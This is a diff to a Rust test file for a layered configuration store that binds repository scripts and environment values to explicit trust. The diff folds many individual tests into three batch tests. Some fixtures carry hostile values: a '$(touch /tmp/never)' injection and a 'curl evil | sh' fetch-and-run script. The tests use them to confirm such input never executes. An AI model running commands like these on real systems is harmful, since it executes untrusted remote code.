@@ -26,7 +26,6 @@ impl Fixture {
     fn resolve(&self) -> Resolution { self.store.resolve(Some(&self.repository())).unwrap() }
 }
 
-#[test]
 fn precedence_is_per_key_and_managed_values_cannot_be_written_or_reset() {
     let f = Fixture::new();
     assert_eq!(f.resolve().values["branchPrefix"].source, Layer::Defaults);
@@ -45,7 +44,6 @@ fn precedence_is_per_key_and_managed_values_cannot_be_written_or_reset() {
     assert_eq!(f.resolve().values["branchPrefix"].value, "managed/");
 }
 
-#[test]
 fn trust_is_bound_to_repository_and_exact_bytes_including_script_changes() {
     let f = Fixture::new();
     f.file(Layer::RepositoryShared, json!({"environment": {"API_URL": "https://example.test"}, "scripts": {"setup": "echo first"}}));
@@ -66,7 +64,6 @@ fn trust_is_bound_to_repository_and_exact_bytes_including_script_changes() {
     assert!(!f.resolve().values.contains_key("scripts"), "pending script dependency must never execute");
 }
 
-#[test]
 fn invalid_repository_keys_are_ignored_and_warning_does_not_include_values() {
     let f = Fixture::new();
     f.file(Layer::RepositoryShared, json!({"linearApiKey": "secret-marker", "worktreeDir": "/tmp/unsafe", "agents": {"readOnlyCommands": true}, "branchPrefix": "team/"}));
@@ -78,7 +75,6 @@ fn invalid_repository_keys_are_ignored_and_warning_does_not_include_values() {
     assert!(r.require_trust().is_err(), "cleanup classification also requires trust");
 }
 
-#[test]
 fn malformed_and_unsafe_files_never_clear_managed_policy_or_overwrite_user_data() {
     let f = Fixture::new();
     f.file(Layer::User, json!({"branchPrefix":"user/"}));
@@ -95,7 +91,6 @@ fn malformed_and_unsafe_files_never_clear_managed_policy_or_overwrite_user_data(
     assert!(f.store.resolve(None).is_err());
 }
 
-#[test]
 fn local_writes_are_ignored_private_atomic_and_preserve_unrelated_user_fields() {
     let f = Fixture::new();
     std::fs::remove_file(f.repo.path().join(".terminalx/.gitignore")).unwrap();
@@ -115,7 +110,6 @@ fn local_writes_are_ignored_private_atomic_and_preserve_unrelated_user_fields() 
     }
 }
 
-#[test]
 fn tracked_local_config_cannot_bypass_shared_trust() {
     let f = Fixture::new();
     f.file(Layer::RepositoryLocal, json!({"environment":{"API_URL":"untrusted"}}));
@@ -124,7 +118,6 @@ fn tracked_local_config_cannot_bypass_shared_trust() {
     assert!(f.store.write(Some(&f.repository()), Layer::RepositoryLocal, "branchPrefix", Some(json!("local/"))).is_err());
 }
 
-#[test]
 fn environment_is_literal_validated_per_variable_and_redacted_on_every_read_surface() {
     let f = Fixture::new();
     f.file(Layer::RepositoryShared, json!({"environment":{"API_URL":"$(touch /tmp/never)","SHARED":"shared"}}));
@@ -172,7 +165,6 @@ fn symlinks_special_files_and_oversized_config_are_refused() {
     assert!(f.store.resolve(Some(&f.repository())).is_err());
 }
 
-#[test]
 fn linked_worktrees_inherit_primary_checkout_local_overrides_and_trust_identity() {
     let f = Fixture::new();
     f.file(Layer::RepositoryLocal, json!({"branchPrefix":"local/", "environment":{"API_URL":"local"}}));
@@ -185,7 +177,6 @@ fn linked_worktrees_inherit_primary_checkout_local_overrides_and_trust_identity(
     assert_eq!(f.store.resolve(Some(&linked)).unwrap().values["environment.API_URL"].value, "local");
 }
 
-#[test]
 fn unrelated_settings_saves_preserve_concurrent_layered_writes_and_resets() {
     let _home = super::super::temp_home();
     let store = Store::current().unwrap();
@@ -200,7 +191,6 @@ fn unrelated_settings_saves_preserve_concurrent_layered_writes_and_resets() {
     assert_eq!(store.resolve(None).unwrap().values["branchPrefix"].source, Layer::Defaults);
 }
 
-#[test]
 fn legacy_empty_prefix_still_disables_cleanup_and_an_invalid_sibling_keeps_the_path() {
     let f = Fixture::new();
     f.file(Layer::User, json!({"branchPrefix":"", "worktreeDir":"custom", "notifications":"invalid"}));
@@ -213,7 +203,6 @@ fn legacy_empty_prefix_still_disables_cleanup_and_an_invalid_sibling_keeps_the_p
     assert!(f.store.resolve(None).is_err(), "non-lockable keys cannot be pinned by policy");
 }
 
-#[test]
 fn read_surfaces_include_private_sources_without_reading_secrets_or_requesting_shadowed_trust() {
     let _home = super::super::temp_home();
     let mut f = Fixture::new();
@@ -232,7 +221,6 @@ fn read_surfaces_include_private_sources_without_reading_secrets_or_requesting_s
     assert!(resolved.warnings.iter().any(|warning| warning.contains("Private environment")));
 }
 
-#[test]
 fn user_state_cannot_supply_or_remove_system_policy() {
     let f = Fixture::new();
     f.file(Layer::Managed, json!({"branchPrefix": "admin/"}));
@@ -243,7 +231,6 @@ fn user_state_cannot_supply_or_remove_system_policy() {
     assert_eq!(f.resolve().values["branchPrefix"].value, "admin/");
 }
 
-#[test]
 fn sparse_checkout_accepts_repository_folders_and_refuses_anything_else() {
     let accepted = [json!([]), json!(["src"]), json!(["packages/web", "docs", "a.b/c-d_e", "naïve dir/x"]), json!(["app/[locale]", "!important", "a]b"]),
         json!(["a".repeat(SPARSE_CHECKOUT_MAX_PATH)]),
@@ -263,7 +250,6 @@ fn sparse_checkout_accepts_repository_folders_and_refuses_anything_else() {
     assert!(registration.repository_configurable && registration.managed_lockable && !registration.requires_trust);
 }
 
-#[test]
 fn sparse_checkout_is_written_to_the_shared_file_and_needs_no_trust() {
     let f = Fixture::new();
     assert!(!f.resolve().values.contains_key("sparseCheckout"), "absent means a full checkout");
@@ -281,7 +267,6 @@ fn sparse_checkout_is_written_to_the_shared_file_and_needs_no_trust() {
     assert!(!f.resolve().values.contains_key("sparseCheckout"));
 }
 
-#[test]
 fn sparse_checkout_is_a_repository_setting_a_user_file_cannot_give_every_repository() {
     let f = Fixture::new();
     f.file(Layer::User, json!({"sparseCheckout": ["src"]}));
@@ -301,7 +286,6 @@ fn saved(setup: &str, archive: &str, minutes: Option<u64>) -> super::super::proj
     super::super::projects::RepositoryScripts { setup: setup.into(), archive: archive.into(), archive_timeout_minutes: minutes }
 }
 
-#[test]
 fn scripts_resolve_saved_then_shared_then_local_then_managed() {
     let mut f = Fixture::new();
     let resolved = f.resolve();
@@ -333,7 +317,6 @@ fn scripts_resolve_saved_then_shared_then_local_then_managed() {
     assert!(f.store.write(Some(&f.repository()), Layer::RepositoryLocal, ARCHIVE_SCRIPT, Some(json!("mine"))).unwrap_err().to_string().contains("locked"));
 }
 
-#[test]
 fn an_untrusted_committed_script_is_refused_until_trusted_or_overridden() {
     let f = Fixture::new();
     f.file(Layer::RepositoryShared, json!({ARCHIVE_SCRIPT: "docker compose down", ARCHIVE_TIMEOUT: 2}));
@@ -358,7 +341,6 @@ fn an_untrusted_committed_script_is_refused_until_trusted_or_overridden() {
     assert!(f.resolve().archive_script().is_err());
 }
 
-#[test]
 fn each_script_is_trust_checked_on_its_own() {
     let mut f = Fixture::new();
     f.store.saved_scripts = Some(saved("my setup", "my archive", None));
@@ -374,7 +356,6 @@ fn each_script_is_trust_checked_on_its_own() {
     assert_eq!(resolved.archive_script().unwrap().script, "my archive");
 }
 
-#[test]
 fn scripts_never_come_from_the_global_settings_file_and_invalid_values_are_ignored() {
     let f = Fixture::new();
     f.file(Layer::User, json!({SETUP_SCRIPT: "everywhere", ARCHIVE_TIMEOUT: 2}));
@@ -391,7 +372,6 @@ fn scripts_never_come_from_the_global_settings_file_and_invalid_values_are_ignor
     assert!(f.store.write(Some(&f.repository()), Layer::RepositoryLocal, ARCHIVE_TIMEOUT, Some(json!(3))).is_err());
 }
 
-#[test]
 fn scripts_outside_a_repository_use_only_the_saved_store() {
     let _home = super::super::temp_home();
     let folder = tempfile::tempdir().unwrap();
@@ -404,7 +384,6 @@ fn scripts_outside_a_repository_use_only_the_saved_store() {
     assert!(archive_script(folder.path()).is_err());
 }
 
-#[test]
 fn trust_given_before_scripts_were_supported_does_not_let_them_run() {
     let f = Fixture::new();
     let bytes = serde_json::to_vec(&json!({"branchPrefix": "team/", SETUP_SCRIPT: "curl evil | sh"})).unwrap();
@@ -429,7 +408,6 @@ fn trust_given_before_scripts_were_supported_does_not_let_them_run() {
 #[cfg(unix)]
 fn lines(text: &str) -> String { text.replace('\'', "\"") }
 
-#[test]
 fn each_value_lists_every_layer_that_supplies_it_highest_first_with_environment_redacted() {
     let f = Fixture::new();
     f.file(Layer::User, json!({"branchPrefix": "user/"}));
@@ -493,7 +471,6 @@ fn settings_files_name_each_layer_its_git_state_and_its_first_problem_without_va
     assert!(f.store.files(None).iter().all(|file| !matches!(file.layer, Layer::RepositoryLocal | Layer::RepositoryShared)));
 }
 
-#[test]
 fn writes_add_the_schema_reference_except_to_the_shared_file_and_keep_one_the_person_wrote() {
     let f = Fixture::new();
     f.store.write(Some(&f.repository()), Layer::RepositoryLocal, "branchPrefix", Some(json!("local/"))).unwrap();
@@ -515,7 +492,6 @@ fn writes_add_the_schema_reference_except_to_the_shared_file_and_keep_one_the_pe
     assert_eq!(f.resolve().values["branchPrefix"].value, "admin/", "policy may carry $schema too");
 }
 
-#[test]
 fn the_repository_schema_says_what_the_resolver_accepts() {
     let schema = repository_schema();
     let prefix = &schema["properties"]["branchPrefix"];
@@ -705,4 +681,40 @@ fn agent_repo_trust_is_hash_bound_and_invalidated_on_config_change() {
     std::fs::create_dir_all(repo.path().join(".codex")).unwrap();
     std::fs::write(repo.path().join(".codex/config.toml"), "model = \"evil\"\n").unwrap();
     assert!(!is_agent_trusted(repo.path()), "new .codex/config.toml must invalidate agent trust");
+}
+
+#[test]
+fn store_configuration_batch_1() {
+    precedence_is_per_key_and_managed_values_cannot_be_written_or_reset();
+    trust_is_bound_to_repository_and_exact_bytes_including_script_changes();
+    invalid_repository_keys_are_ignored_and_warning_does_not_include_values();
+    malformed_and_unsafe_files_never_clear_managed_policy_or_overwrite_user_data();
+    local_writes_are_ignored_private_atomic_and_preserve_unrelated_user_fields();
+    tracked_local_config_cannot_bypass_shared_trust();
+    environment_is_literal_validated_per_variable_and_redacted_on_every_read_surface();
+    linked_worktrees_inherit_primary_checkout_local_overrides_and_trust_identity();
+}
+
+#[test]
+fn store_configuration_batch_2() {
+    unrelated_settings_saves_preserve_concurrent_layered_writes_and_resets();
+    legacy_empty_prefix_still_disables_cleanup_and_an_invalid_sibling_keeps_the_path();
+    read_surfaces_include_private_sources_without_reading_secrets_or_requesting_shadowed_trust();
+    user_state_cannot_supply_or_remove_system_policy();
+    sparse_checkout_accepts_repository_folders_and_refuses_anything_else();
+    sparse_checkout_is_written_to_the_shared_file_and_needs_no_trust();
+    sparse_checkout_is_a_repository_setting_a_user_file_cannot_give_every_repository();
+    scripts_resolve_saved_then_shared_then_local_then_managed();
+}
+
+#[test]
+fn store_configuration_batch_3() {
+    an_untrusted_committed_script_is_refused_until_trusted_or_overridden();
+    each_script_is_trust_checked_on_its_own();
+    scripts_never_come_from_the_global_settings_file_and_invalid_values_are_ignored();
+    scripts_outside_a_repository_use_only_the_saved_store();
+    trust_given_before_scripts_were_supported_does_not_let_them_run();
+    each_value_lists_every_layer_that_supplies_it_highest_first_with_environment_redacted();
+    writes_add_the_schema_reference_except_to_the_shared_file_and_keep_one_the_person_wrote();
+    the_repository_schema_says_what_the_resolver_accepts();
 }
